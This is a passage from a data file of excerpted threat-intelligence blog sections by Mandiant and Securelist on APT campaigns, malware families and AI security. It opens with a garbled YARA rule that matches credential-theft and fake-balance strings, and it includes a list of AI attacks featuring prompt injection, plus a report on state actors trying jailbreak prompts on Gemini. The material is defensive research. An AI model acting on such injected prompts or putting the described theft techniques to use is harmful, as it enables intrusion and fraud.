\n$\\$12$ \"supportedAssets\" ascii fullword   \n$\\$12$ \"supportedAccounts\" ascii fullword   \n$\\$14$ \"currencySymbol\" ascii fullword   \n$\\$15$ \"userId\" ascii fullword   \n$\\$16$ \"settings\" ascii fullword   \n$\\$17$ \"extensions\" ascii fullword   \n$\\$51=$ \"Confirm settings change\"   \n\\$s2 = \"2-step verification\"   \n$\\$53$ \"This extra step is to make sure it's re   \n$\\$54$ \"Enter the 2-step verification code we t   \n$\\$55$ \"Enter the 2-step verification code from   \n$\\$56$ \"Didn't receive the SMS?\"   \n$\\$57$ \"Re-send SMS\"   \n\\$u1 = \"\\${DOMAIN}/settings\"   \n\\$u2 = \"\\${DOMAIN}/exchange/get-address?type=\\${t   \n\\$u3 = \"\\${DOMAIN}/exchange/create-account\"   \n\\$u4 = \"\\${DOMAIN}/exchange/set-balance\"   \n\\$u5 = \"\\${DOMAIN}/exchange/set-all-balances\"   \n\\$u6 = \"\\${DOMAIN}/exchange/set-withdraw\"   \n$\\$1=$ \"password $=$ localStorage.getItem('coinb   \n$\\$123$ \"email $=$ localStorage.getItem('coinbase   \n$\\$1=$ \"getExchangeRates\" fullword   \n$\\$12$ \"getSupportedAssets\" fullword   \n$\\$123$ \"getAccounts\" fullword   \n$\\$14$ \"currentWithdraw\" \ncondition: \nfilesize $<$ 1MB and (( $\\$8$ anchor and (8 of them)) ", "source": "mandiant"}, {"title": "Conclusion", "content": "Global expansion, extortion tactics, and the use of virtualized infrastructure all highlight the adaptable strategies employed by DPRK IT workers. In response to heightened awareness of the threat within the United States, they've established a global ecosystem of fraudulent personas to enhance operational agility. Coupled with the discovery of facilitators in the $\\mathsf{U K},$ this suggests the rapid formation of a global infrastructure and support network that empowers their continued operations. \nFor detailed mitigation and detection strategies, please read our previous report on DPRK IT workers. For even more details, read our IT worker Transform post. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The activity described in this blog post presented a well-known Iranian threat actor utilizing their triedand-true techniques to breach targeted organizations. Luckily, with FireEye's platform in place, our Managed Defense customers were not impacted. Furthermore, upon the blocking of this activity, FireEye was able to expand upon the observed indicators to identify a broader campaign, as well as the use of new and old malware. \nWe suspect this will not be the last time APT34 brings new tools to the table. Threat actors are often reshaping their TTPs to evade detection mechanisms, especially if the target is highly desired. For these reasons, we recommend organizations remain vigilant in their defenses, and remember to view their environment holistically when it comes to information security. \nHard Pass: Declining APT34's Invite to Join Their Professional Network | Mandiant | Google Cloud Blog Learn more about Mandiant Managed Defense, and catch an on-demand recap on this and the Top 5 Managed Defense attacks this year. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The CARBANAK source code is illustrative of how these malware authors addressed some of the practical concerns of obfuscation. Both the tasking code and the Windows API resolution system represent significant investments in throwing malware analysts off the scent of this backdoor. Check out Part Two of this series for a round-up of antivirus evasions, exploits, secrets, key material, authorship artifacts, and network-based indicators. Part Three and Part Four are available now as well! ", "source": "mandiant"}, {"title": "Overview", "content": "Threat modeling is a systematic approach to identifying, analyzing, and mitigating potential security threats to a digital asset. Threat modeling is essential for securing AI pipelines. The logical next question is how to threat model for AI. The process is similar to what you would do for any other digital asset such as a web application or a critical system. To break the process down into a few steps: \n1. Identify the components of the AI pipeline   \n2. Identify threats to the components   \n3. Develop plausible attack scenarios and attack paths that threat actors may leverage to target the components   \n4. Identify and map existing security controls   \n5. Determine gaps in existing security controls by identifying areas where there are no controls or where the controls are inadequate   \n6. Plan and execute remediations by identifying and implementing controls to close the gaps. \nThreat modeling can seem straightforward when broken down into six steps. However, as is the case with most technology, it is not quite as straightforward in practice. There are a number of challenges that can make threat modeling difficult, including: \nLack of expertise Time constraints \nCultural challenges (reactive mindset versus proactive mindset) Lack of cyber threat intelligence \nWhen threat modeling for AI, it is important to consider the following: \nThe type of AI being used. There are different types of AI, each with its own unique risks. For example, classification models can be vulnerable to data poisoning attacks, while natural language processing models can be vulnerable to adversarial examples.   \nThe data used to train and deploy AI models. If the data is not properly secured, it could be used to train malicious models.   \nThe environment in which AI models are deployed. AI models can be deployed in a variety of environments, and each environment will have its own unique risks. For example, models deployed in the cloud are vulnerable to cloud-based attacks, while models deployed onpremises are vulnerable to on-premises attacks.   \nThe software used to develop and serve the AI models. Like other software, supply-chain risks are still part of the threat model. For example, using obscure third-party libraries as part of your clean and process data process could introduce risks. \nTo mitigate these risks, organizations should consider strategies that address the following: \nData security. The data used to train and deploy the models should be properly secured. \nModel security. AI models should be properly secured using measures such as input validation, output sanitization, and model monitoring.   \nEnvironment security. The environment in which AI models are deployed should be properly secured using measures such as software security and verification, network segmentation and access controls. \nOne of the primary challenges we see organizations struggle with is coming up with plausible scenarios and attack paths when threat modeling. There needs to be an understanding for how an attack may be executed in order to develop an effective threat model. To help on this front, we have curated the GAIA Top 10. ", "source": "mandiant"}, {"title": "Introduction", "content": "The following is what we believe to be the most common list of attacks and weaknesses for AI that attackers might use against the conceptual AI pipeline and resulting GenAI Model. \nG01 \u2013 Prompt Injection \nThis is where an attacker will try to inject bad data or information into the prompt in order to make your model do something you don't want it to do, such as try to access the underlying operating system or make it output embarrassing results that could be shared on social media. \nG02 \u2013 Sensitive Data Exposure \nThis is where an attacker is able to access sensitive data due to insufficient curation of training data or attacker gaining access to underlying tech stack.   \nG03 \u2013 Data Integrity Failure This is where an attacker is able to inject adversarial data into the model or embeddings database after an attacker gains access to the underlying tech stack.   \nG04 \u2013 Poor Access Control This is where the underlying tech stack has insufficient access control and the attacker is able to download the model or APIs have not been designed with access control in mind.   \nG05 \u2013 Insufficient Prompt & Hallucination Filtering This is where prompt filters have not been adequately tested or red-teamed with abuse cases or common data hallucinations have not been adequately tested or red-teamed with abuse cases.   \nG06 \u2013 Agent Excessive Access This is where a public facing agent has access to private/restricted internal APls or a public facing agent has access to \nprivate/restricted models or an agent has access to financial systems. \nG07 \u2013 Supply Chain Attacks \nSimilar to software development tech stacks, AI tech stacks rely on a variety of third-party libraries (particularly Python libraries). If using open source libraries, these libraries could have been compromised by malicious third parties. Additionally, third-party repositories of AI models could have been compromised. It is worth noting that the model itself, if built using Python, could be in the default configuration of a mixture of code and data, and could potentially run attacker code upon install. \nG08 \u2013 Denial of Service Attacks This is where throttling or rate limiting are not in place or load balancing is not adequate. \nG09 \u2013 Insufficient Logging \nSimilarly to standard tech stacks, there are various points at which useful logging data could be gathered and sent to a centralized SIEM, which could aid defenders in identifying an ongoing attack. Logging is often an afterthought for AI pipelines. \nG10 \u2013 Insecure public facing deployment   \nExamples of cases of insecure public facing deployment might be a model deployed directly on an unsecured inference server or made directly downloadable. Also, an Inference API or Web Service being vulnerable, unpatched and not up-to-date, \nand excessive permissions for service accounts on inference servers. \nThe following diagram illustrates the parts of the AI pipeline that could be vulnerable to the GAIA Top 10. \nOrganizations should consider their tech stack along with the GAIA Top 10 when asking the question \"how do we secure this\", with the idea that the AI pipeline is built on known technology, and thus, any mitigations put in place are mostly modifications of existing security controls. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The technology stack on which AI is built is well understood. As a result, the attack vectors are also similar to those we already understand. It's just about looking at it through a new lens. \nBeing proactive is key. Now is the time to take steps to prevent potential attacks from happening in the first place. When securing AI systems, it is important to think like an attacker. Consider known weaknesses and identify the ways that an attacker could exploit a system. Work with other teams in the organization-including data science, engineering, and security-to develop a comprehensive security plan. \nContact Mandiant to learn how we can help with security for your AI endeavors. For more on methods \nSecuring the AI Pipeline | Mandiant | Google Cloud Blog to consider when securing the AI pipeline, we recommend reading Google's SAIF approach. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "As anticipated in our 2017 predictions report, the use of ATM malware will continue to increase, especially in underdeveloped countries with weaker physical security controls. By leveraging the Kalignite Platform, Ploutus can be easily modified to attack various ATM vendors and operating systems. ", "source": "mandiant"}, {"title": "Conclusion", "content": "I hope this explanation of China Chopper's features, platform versatility, delivery mechanisms, traffic analysis, and detection give you the knowledge and tools you need to eradicate this elegantly designed but dangerous menace. \nGood hunting. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant cannot attribute this activity based on the evidence collected thus far, however, this type of activity is consistent with previous operations by China-nexus actors based on known capabilities and actions against Citrix ADC's in 2022. The   \nevolution of the China-nexus cyber threat   \nlandscape has evolved to such an extent, that its ecosystem mirrors more closely that of financial crime clusters, with connections and code overlap not necessarily offering the comprehensive picture. Additionally, Mandiant has observed a   \npreponderance of actors utilizing the combination of NPS proxy and REGEORG.NEO as having a Chinanexus. \nMedia reports indicate APT5 exploited a zero day vulnerability in Citrix ADC and Gateway devices allowing pre-authenticated remote code execution on vulnerable devices. Following that exploitation, the National Security Agency (NSA) published a report detailing APT5 capabilities against Citrix ADCs. In the report, NSA states targeting Citrix ADCs can facilitate illegitimate access to targeted organizations by bypassing normal authentication controls. NSA, in collaboration with partners, developed threat hunting guidance to provide steps organizations can take to look for possible artifacts of this type of activity. \nMandiant tracks additional Chinese cyber espionage threat actors using botnets to obfuscate traffic between attackers and victim networks, including APT41, APT31, APT15, TEMP.Hex, and Volt Typhoon. Cyber espionage threat actors continue to target technologies that do not support endpoint detection and response (EDR) solutions such as firewalls, IoT devices, hypervisors and VPN technologies (e.g. Fortinet, SonicWall, Pulse Secure, and others). Mandiant has investigated dozens of intrusions at defense industrial base (DIB), government, technology, and telecommunications organizations over the years where suspected China-nexus groups have exploited zero-day vulnerabilities and deployed custom malware to steal user credentials and maintain long-term access to the victim environments. \nPosted in Threat Intelligence ", "source": "mandiant"}, {"title": "Background", "content": "Active since at least 2013, TEMP.Periscope has primarily focused on maritime-related targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities (targeting is summarized in Figure 1). The group has also targeted professional/consulting services, high-tech industry, healthcare, and media/publishing. TEMP.Periscope overlaps in targeting, as well as tactics, techniques, and procedures (TTPs), with TEMP.Jumper, a group that also overlaps significantly with public reporting by Proofpoint and F-Secure on \"NanHaiShu.\" ", "source": "mandiant"}, {"title": "Background", "content": "FireEye analyzed files on three open indexes believed to be controlled by TEMP.Periscope, which yielded insight into the group's objectives, operational tactics, and a significant amount of technical attribution/validation. These files were \"open indexed\" and thus accessible to anyone on the public internet. This TEMP.Periscope activity on these servers extends from at least April 2017 to the present, with the most current operations focusing on Cambodia's government and elections. \nTwo servers, chemscalere[.]com and scsnewstoday[.]com, operate as typical C2 servers and hosting sites, while the third, mlcdailynews[.]com, functions as an active SCANBOX server. The C2 servers contained both logs and malware. \nAnalysis of logs from the three servers revealed: \nPotential actor logins from an IP address located in Hainan, China that was used to remotely access and administer the servers, and interact with malware deployed at victim organizations. \nMalware command and control check-ins from victim organizations in the education, aviation, chemical, defense, government, maritime, and technology sectors across multiple regions. FireEye has notified all of the victims that we were able to identify. \nThe malware present on the servers included both new families (DADBOD, EVILTECH) and previously identified malware families (AIRBREAK, EVILTECH, HOMEFRY, MURKYTOP, HTRAN, and SCANBOX) . ", "source": "mandiant"}, {"title": "Attribution", "content": "Our analysis of the servers and surrounding data in this latest campaign bolsters our previous assessment that TEMP.Periscope is likely Chinese in origin. Data from a control panel access log indicates that operators are based in China and are operating on computers with Chinese language settings. \nA log on the server revealed IP addresses that had been used to log in to the software used to communicate with malware on victim machines. One of the IP addresses, 112.66.188.28, is located in Hainan, China. Other addresses belong to virtual private servers, but artifacts indicate that the computers used to log in all cases are configured with Chinese language settings. ", "source": "mandiant"}, {"title": "Overview", "content": "In the last several weeks, APT3 actors launched a large-scale phishing campaign against organizations in the following industries: \nAerospace and Defense Construction and Engineering High Tech \nTelecommunications Transportation \nUpon clicking the URLs provided in the phishing emails, targets were redirected to a compromised server hosting JavaScript profiling scripts. Once a target host was profiled, victims downloaded a malicious Adobe Flash Player SWF file and an FLV file, detailed below. This ultimately resulted in a custom backdoor known as SHOTPUT, detected by FireEye as Backdoor.APT.CookieCutter, being delivered to the victim's system. \nThe payload is obscured using xor encoding and appended to a valid GIF file. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Once APT3 has access to a target network, they work quickly and they are extremely proficient at enumerating and moving laterally to maintain their access. Additionally, this group uses zero-day exploits, continually updated custom backdoors, and throwaway CnC infrastructure, making it difficult to track them across campaigns. ", "source": "mandiant"}, {"title": "Conclusion", "content": "CVE-2017-8759 is the second zero-day vulnerability used to distribute FINSPY uncovered by FireEye in 2017. These exposures demonstrate the significant resources available to \"lawful intercept\" companies and their customers. Furthermore, FINSPY has been sold to multiple clients, suggesting the vulnerability was being used against other targets. \nIt is possible that CVE-2017-8759 was being used by additional actors. While we have not found evidence of this, the zero day being used to distribute FINSPY in April 2017, CVE-2017-0199 was simultaneously being used by a financially motivated actor. If the actors behind FINSPY obtained this vulnerability from the same source used previously, it is possible that source sold it to additional actors. ", "source": "mandiant"}, {"title": "Acknowledgement", "content": "Thank you to Dhanesh Kizhakkinan, Joseph Reyes, FireEye Labs Team, FireEye FLARE Team and FireEye iSIGHT Intelligence for their contributions to this blog. We also thank everyone from the Microsoft Security Response Center (MSRC) who worked with us on this issue. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Introduction", "content": "The explosive growth of malware continues to challenge traditional, manual analysis methods, underscoring the urgent need for improved automation and innovative approaches. Generative AI models have become invaluable in some aspects of malware analysis, yet their effectiveness in handling large and complex malware samples has been limited. The introduction of Gemini 1.5 Pro, capable of processing up to 1 million tokens, marks a significant breakthrough. This advancement not only empowers AI to function as a powerful assistant in automating the malware analysis workflow but also significantly scales up the automation of code analysis. By substantially increasing the processing capacity, Gemini 1.5 Pro paves the way for a more adaptive and robust approach to cybersecurity, \nFrom Assistant to Analyst: The Power of Gemini 1.5 Pro for Malware Analysis | Google Cloud Blog helping analysts manage the asymmetric volume of threats more effectively and efficiently. ", "source": "mandiant"}, {"title": "Conclusion", "content": "I hope this blog has shown the power of automatically grouping nodes within a disassembly graph view, and viewing these groups in isolation to help with your analysis. This plug-in has become a staple of my workflow, and we're releasing it to the community with the hope that others find it useful as well. ", "source": "mandiant"}, {"title": "Appendix", "content": "Finding isolated subgraphs relies on calculating the immediate dominator and immediate postdominator trees for a given function graph. \nA node d dominates n if every path to n must go through d. \nThe immediate dominator p of node n is basically the closest dominator to n, where there is no node t where p dominates t, and t dominates n. \nA node z post-dominates a node n if every path from n to the exit node must go through z. \nThe immediate post-dominator x of node n is the closest post-dominator, where there is no node t where t post-dominates n and x post-dominates t. \nThe immediate dominator relationship forms a tree of nodes, where every node has an immediate dominator other than the entry node. \nThe Lengauer-Tarjan algorithm can efficiently calculate the immediate dominator tree of a graph. It can also calculate the immediate post-dominator tree by reversing the direction of each edge in the same graph. \nThe plug-in calculates the immediate dominator tree and immediate post-dominator tree of the function control flow graph and looks for the situations where the (idom[i] $\\mathrm{=}\\mathrm{=j}$ ) and (ipdom[j] $==\\mathrm{i}$ ). This means all paths from the function start to node i \nmust go through node j, and all paths from j to the function terminal must go through i. A candidate isolated subgraph thus starts at node j and ends at node i. \nFor each candidate isolated subgraph, the plug-in further verifies only the entry node has predecessor nodes not in the candidate subgraph. The plug-in also filters out candidate subgraphs by making sure they have a minimum node count and cover a   \nmaximum percentage of nodes (see   \nMINIMUM_SUBGRAPH_NODE_COUNT and   \nMAXIMUM_SUBGRAPH_NODE_PERCENTAGE in the config section). \nOne complication is that functions often have more than one terminal node \u2013 programmers can arbitrarily return from the current function at any point. The immediate post-dominator tree is calculated for every terminal node, and any inconsistencies are marked as indeterminate and are not possible candidates for use. Functions with infinite loops do not have terminal nodes, and are not currently handled. \nFor a simple example, consider the graph in Figure 14. It has the following immediate dominator and post-dominator trees: \nExample graph \nLooking for pairs of (idom[i] $==\\mathrm{j}$ ) and (ipdom[j] $==\\mathrm{i}$ ) gives the following: \n(0, 8) (1, 3) (3, 6) (6,7) \n(0, 8) is filtered because it makes up all of the nodes of the graph. \n(1,3) and (6, 7) are filtered out because they contain nodes reachable from nodes not in the set: for (1, 3) node 2 is reachable from node 6, and for (6, 7) node 2 is reachable from node 1. \nThis leaves (3, 6) as the only isolate subgraph in this example, shown in Figure 15. \nFLARE IDA Pro Script Series: Simplifying Graphs in IDA | Mandiant | Google Cloud Blog \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "Use of cryptocurrency mining malware is a popular tactic leveraged by financially-motivated cyber criminals to make money from victims. We've \nobserved one threat actor mining around 1 XMR/day, demonstrating the potential profitability and reason behind the recent rise in such attacks. Additionally, these operations may be perceived as less risky when compared to ransomware operations, since victims may not even know the activity is occurring beyond the slowdown in system performance. \nNotably, cryptocurrency mining malware is being distributed using various tactics, typically in an opportunistic and indiscriminate manner so cyber criminals will maximize their outreach and profits. \nFireEye HX, being a behavior-based solution, is not affected by cryptominer tricks. FireEye HX detects these threats at the initial level of the attack cycle, when the attackers attempt to deliver the first stage payload or when the miner tries to connect to mining pools. \nAt the time of writing, FireEye HX detects this activity with the following indicators: ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this post we walked through our analysis of the sample that the threat intel team provided to us and all its components. Through our initial triage, we found that its \"dfsds.exe\" component is Dark Crystal RAT. We found that Dark Crystal RAT was a .NET executable, and reverse engineered it. We extracted the malware's configuration, and through dynamic analysis discovered the syntax of its C2 communications. We implemented a small proof-ofconcept server to test the correct format of commands that can be sent to the malware, and how to interpret its uploaded screenshots. Finally, we took a second look at how actual threat actors would download and use Dark Crystal RAT. \nTo conclude, indicators of compromise for this version of Dark Crystal RAT (MD5:   \n047af34af65efd5c6ee38eb7ad100a01) are given in Table 4. \nDark Crystal RAT (dfsds.exe) ", "source": "mandiant"}, {"title": "Summary", "content": "Mandiant observed two distinct attack lifecycles where the threat actor abused Fortinet technologies to establish network access. The first occurred when the threat actor initially gained access to the Fortinet ecosystem while the FortiManager device was exposed to the internet. \nDuring this attack lifecycle, as seen in Figure 1, backdoors disguised as legitimate API calls (THINCRUST) were deployed across both FortiAnalyzer and FortiManager devices. Once persistence was established across the two devices, FortiManager scripts were used to deploy backdoors (CASTLETAP) across the FortiGate devices. \nMandiant observed SSH connections from the Fortinet devices to the ESXi servers, followed by the installation of malicious vSphere Installation Bundles which contained VIRTUALPITA and VIRTUALPIE backdoors. This enabled the threat actor persistent access to the hypervisors, and allowed the attacker to execute commands on guest virtual machines. \nMandiant has no evidence of a zero-day vulnerability being used to gain initial access or deploy the malicious VIBs at the time of writing this post. VIRTUALPITA and VIRTUALPIE were discussed in more detail in a previous Mandiant blog post published in September 2022. ", "source": "mandiant"}, {"title": "Summary", "content": "The second attack lifecycle occurred where the FortiManager devices had network Access Control Lists (ACL) put in place to restrict external access to only TCP port 541 (FortiGate to FortiManager Protocol). During this attack lifecycle, as seen in Figure 2, the threat actor deployed a network traffic redirection utility (TABLEFLIP) and reverse shell backdoor (REPTILE) on the FortiManager device to circumvent the new ACLs. With the redirection rules established by the TABLEFLIP utility, the threat actor was able to access the REPTILE backdoor directly from the Internet for continued access to the environment. ", "source": "mandiant"}, {"title": "Attribution", "content": "UNC3886 is an advanced cyber espionage group with unique capabilities in how they operate onnetwork as well as the tools they utilize in their campaigns. UNC3886 has been observed targeting firewall and virtualization technologies which lack EDR support. Their ability to manipulate firewall firmware and exploit a zero-day indicates they have curated a deeper-level of understanding of such technologies. UNC3886 has modified publicly available malware, specifically targeting \\*nix operating systems. \nAnother threat cluster unrelated to UNC3886, suspected to be from China has recently been observed targeting zero-day vulnerabilities in Fortinet as reported by Mandiant in mid-January of 2023. Mandiant continues to gather evidence and identify overlaps between UNC3886 and other groups that are attributed to Chinese APT. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The activity discussed in this blog post is further evidence that advanced cyber espionage threat actors are taking advantage of any technology available to persist and traverse a target environment, especially those technologies that do not support EDR solutions. This presents a unique challenge for investigators as many network appliances lack solutions to detect runtime modifications made to the underlying operating system and require direct involvement of the manufacturer to collect forensic images. Cross organizational communication and collaboration is key to providing both manufacturers with early notice of new attack methods in the wild before they are made public and investigators with expertise to better shed light on these new attacks. \nMandiant recommends organizations using the ESXi and the VMware infrastructure suite follow the hardening steps outlined in this blog post to minimize the attack surface of ESXi hosts. ", "source": "mandiant"}, {"title": "Summary", "content": "https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai \nGoogle Threat Intelligence Group (GTIG) is committed to tracking and protecting against cyber threat activity. We relentlessly defend Google, our users, and our customers by building the most complete threat picture to disrupt adversaries. As part of that effort, we investigate activity associated with threat actors to protect against malicious activity, including the misuse of generative AI or LLMs. \nThis report shares our findings on governmentbacked threat actor use of the Gemini web application. The report encompasses new findings across advanced persistent threat (APT) and coordinated information operations (IO) actors tracked by GTIG. By using a mix of analyst review and LLM-assisted analysis, we investigated prompts by APT and IO threat actors who attempted to misuse Gemini. \nAdvanced Persistent Threat (APT) refers to government-backed hacking activity, including cyber espionage and destructive computer network attacks. \nInformation Operations (IO) attempt to influence online audiences in a deceptive, coordinated manner. Examples include sockpuppet accounts and comment brigading. \nGTIG takes a holistic, intelligence-driven approach to detecting and disrupting threat activity, and our understanding of government-backed threat actors and their campaigns provides the needed context to identify threat enabling activity. We use a wide variety of technical signals to track governmentbacked threat actors and their infrastructure, and we are able to correlate those signals with activity on our platforms to protect Google and our users. By tracking this activity, we're able to leverage our insights to counter threats across Google platforms, including disrupting the activity of threat actors who have misused Gemini. We also actively share our insights with the public to raise awareness and enable stronger protections across the wider ecosystem. \nOur analysis of government-backed threat actor use of Gemini focused on understanding how threat actors are using AI in their operations and if any of this activity represents novel or unique AI-enabled attack or abuse techniques. Our findings, which are consistent with those of our industry peers, reveal that while AI can be a useful tool for threat actors, it is not yet the game-changer it is sometimes portrayed to be. While we do see threat actors using generative AI to perform common tasks like troubleshooting, research, and content generation, we do not see indications of them developing novel capabilities. \nOur key findings include: \nWe did not observe any original or persistent attempts by threat actors to use prompt attacks or other machine learning (ML)- focused threats as outlined in the Secure AI Framework (SAIF) risk taxonomy. Rather than engineering tailored prompts, threat actors used more basic measures or publicly available jailbreak prompts in unsuccessful attempts to bypass Gemini's safety controls. \nThreat actors are experimenting with Gemini to enable their operations, finding productivity gains but not yet developing novel capabilities. At present, they primarily use AI for research, troubleshooting code, and creating and localizing content. \nAPT actors used Gemini to support several phases of the attack lifecycle, including researching potential infrastructure and free hosting providers, reconnaissance on target organizations, research into vulnerabilities, payload development, and assistance with malicious scripting and evasion techniques. Iranian APT actors were the heaviest users of Gemini, using it for a wide range of purposes. Of note, we observed limited use of Gemini by Russian APT actors during the period of analysis. \nIO actors used Gemini for research; content generation including developing personas and messaging; translation and localization; and to find ways to increase their reach. Again, Iranian IO actors were the heaviest users of Gemini, accounting for three quarters of all use by IO actors. We also observed Chinese and Russian IO actors using Gemini primarily for general research and content creation. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The release of Log4Shell in mid-December 2021 capped off the worst year on record for the exploitation of zero-day vulnerabilities. We can only expect this trend to continue, with PoCs becoming available within mere hours of a vulnerability's disclosure, like in Log4Shell's case, furthering the need for diligent and proactive asset and patch management. \nAdversaries of every category will continue to exploit CVE-2021-44228 in unpatched systems for the foreseeable future due to Apache Log4j integration in unknown numbers of applications. Ivanti and Mandiant highly recommend organizations patch this vulnerability in their environment to protect themselves against attacks that aim to exploit this issue. Leveraging Mandiant's Attack Surface Management platform, organizations can better identify vulnerable Log4j instances in their environment. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The inauthentic news sites operated by GLASSBRIDGE illustrate how information operations actors have embraced methods beyond social media in an attempt to spread their narratives. We have observed similar behavior from Russian and \nIranian IO actors. By posing as independent, and often local news outlets, IO actors are able to tailor their content to specific regional audiences and present their narratives as seemingly legitimate news and editorial content. In fact, the content has been crafted or amplified by PR and newswire firms who conceal their role, or actively misrepresent their content as local and independent news coverage. In the case of GLASSBRIDGE, the consistency in content, behavioral similarities, connections across firms, and pro-PRC messaging suggests the private firms take direction from a shared customer who outsourced the creation of influence campaigns. Google is committed to information transparency, and we will continue tracking GLASSBRIDGE and blocking their inauthentic content on Google's platforms. We regularly disclose our latest enforcement actions in the TAG Bulletin. ", "source": "mandiant"}, {"title": "Introduction", "content": "UPDATE June 27, 2017: About a new wave of Petya/Petrwrap/NotPetya/exPetr ransomware attacks read: Schroedinger's Pet(ya) \nThis year we found a new family of ransomware used in targeted attacks against organizations. After penetrating an organization's network the threat actors used the PsExec tool to install ransomware on all endpoints and servers in the organization. The next interesting fact about this ransomware is that the threat actors decided to use the well-known Petya ransomware to encrypt user data. As you may know, this family of ransomware has a RaaS model, but the threat actor decided not to use this ability. To get a workable version of the ransomware, the group behind PetrWrap created a special module that patches the original Petya ransomware \"on the fly\". This is what makes this new malware so unique. ", "source": "securelist"}, {"title": "Conclusion", "content": "Targeted attacks on organizations with the main aim of encrypting data are becoming more popular. The groups using ransomware in their targeted attacks usually try to find vulnerable servers or servers with unprotected RDP access. After penetrating an organization's network they use special frameworks like Mimikatz to obtain the necessary credentials for installing ransomware throughout the network. To protect against such attacks, organizations need to keep their server software up to date, use secure passwords for remote access systems, install security solutions on their servers and use security solutions with behavioral detection components on their endpoints. ", "source": "securelist"}, {"title": "Introduction", "content": "While analyzing the Flame malware that we detected in May 2012, Kaspersky Lab experts identified some distinguishing features of Flame's modules. Based on those features, we discovered that in 2009, the first variant of the Stuxnet worm included a module that was created based on the Flame platform. This indicates that there was some form of collaboration between the groups that developed the Flame and Tilded (Stuxnet/Duqu) platforms. \nBased on the results of a detailed analysis of Flame, we continued to actively search for new, unknown components. A more in-depth analysis conducted in June 2012 resulted in the discovery of a new, previously unknown malware platform that uses a modular structure resembling that of Flame, a similar code base and system for communicating to C&C servers, as well as numerous other similarities to Flame. \nIn our opinion, all of this clearly indicates that the new platform which we discovered and which we called 'Gauss,' is another example of a cyber-espionage toolkit based on the Flame platform. \nGauss is a project developed in 2011-2012 along the same lines as the Flame project. The malware has been actively distributed in the Middle East for at least the past 10 months. The largest number of Gauss infections has been recorded in Lebanon, in contrast to Flame, which spread primarily in Iran. \nFunctionally, Gauss is designed to collect as much information about infected systems as possible, as well as to steal credentials for various banking systems and social network, email and IM accounts. The Gauss code includes commands to intercept data required to work with several Lebanese banks \u2013 for instance, Bank of Beirut, Byblos Bank, and Fransabank. \nCuriously, several Gauss modules are named after famous mathematicians. The platform includes modules that go by the names 'Gauss', 'Lagrange', 'Godel', 'Tailor', 'Kurt' (in an apparent reference to Godel). The Gauss module is responsible for collecting the most critical information, which is why we decided to name the entire toolkit after it. \nGauss is a much more widespread threat than Flame. However, we have found no self-replication functionality in the modules that we have seen to date, which leaves open the question of its original attack vector. ", "source": "securelist"}, {"title": "Conclusion", "content": "Gauss is the most recent development from the pool of cyber-espionage projects that includes Stuxnet, Flame and Duqu. It was most likely created in mid-2011 and deployed for the first time in August-September 2011. \nIts geographical distribution is unique; the majority of infections were found in Lebanon, Palestine and Israel. One of the modules from Jan 2012 contains the path 'c:documents and settingsflamerdesktopgauss_white_1'. The 'flamer' in the path above is the Windows username that compiled the project. Given the focus on Lebanon, the 'white' version identifier can probably be explained as following: 'the name Lebanon comes from the Semitic root LBN, meaning \"white\", likely a reference to the snow-capped Mount Lebanon.' (Wikipedia) \nCode references and encryption subroutines, together with the Command and Control infrastructure make us believe Gauss was created by the same 'factory' which produced Flame. This indicates it is most likely a nation-state sponsored operation. \nBetween Gauss' functions, the 'Winshell.ocx' module which gives the name to the malware as 'Gauss', steals credentials required to access online banking accounts for several Lebanese banks \u2013 including the Bank of Beirut, Byblos Bank and Fransabank. This is the first publicly known nation-state sponsored banking Trojan. \nAnother feature which makes Gauss unique is its encrypted payload, which we haven't been able to unlock. The payload is run by infected USB sticks and is designed to surgically target a certain system (or systems) which have a specific program installed. One can only speculate on the purpose of this mysterious payload. \nThe discovery of Gauss indicates that there are probably many other related cyber-espionage malware in operation. The current tensions in the Middle East are just signs of the intensity of these ongoing cyber-war and cyber-espionage campaigns. ", "source": "securelist"}, {"title": "Introduction", "content": "In September 2024, a series of attacks targeted Russian companies, revealing indicators of compromise and tactics associated with two hacktivist groups: Head Mare and Twelve. Our investigation showed that Head Mare relied heavily on tools previously associated with Twelve. Additionally, Head Mare attacks utilized command-and-control (C2) servers exclusively linked to Twelve prior to these incidents. This suggests potential collaboration and joint campaigns between the two groups. \nThe attackers continue to refine their methods, employing both familiar tools from past Head Mare incidents and new PowerShell-based tools. \nThis report analyzes the software and techniques observed in recent Head Mare attacks and how these overlap with Twelve's activities. The focus is on Head Mare's TTPs and their evolution, with notes on commonalities with Twelve's TTPs. ", "source": "securelist"}, {"title": "Conclusion", "content": "Head Mare is actively expanding its set of techniques and tools. In recent attacks, they gained initial access to the target infrastructure by not only using phishing emails with exploits but also by compromising contractors. \nThey also use tools previously seen in attacks by other groups, such as Twelve's CobInt backdoor. \nThis is not the only similarity between the two groups. In addition to the toolkit, the following were noticed: \nShared command-and-control servers: 360nvidia[.]com, 45.156.27[.]115   \nPowerShell scripts accessing these C2 servers: mcdrive.ps1   \nScripts for tunneling network connections: proxy.ps1 \nBased on the factors described above, we assume that Head Mare is working with Twelve to launch attacks on state- and privately controlled companies in Russia. We will continue to monitor the activity of the attackers and share up-to-date information about their TTPs. More details about the hacktivists' activities and their tools, such as PhantomJitter, can be found in the materials available to subscribers of our Threat Intelligence reports. ", "source": "securelist"}, {"title": "Introduction", "content": "It's just another cryptocurrency miner... Nobody would even suspect the mining malware was merely a mask, masquerading behind an intricate modular framework that supports both Linux and Windows. It comes equipped with a built-in TOR network tunnel for communication with command servers, along with update and delivery functionality through trusted services such as GitLab, GitHub, and Bitbucket, all using custom encrypted archives. The amount of effort that went into creating the framework is truly remarkable, and its disclosure was quite astonishing. ", "source": "securelist"}, {"title": "Conclusion", "content": "This article represents an effort to bring the 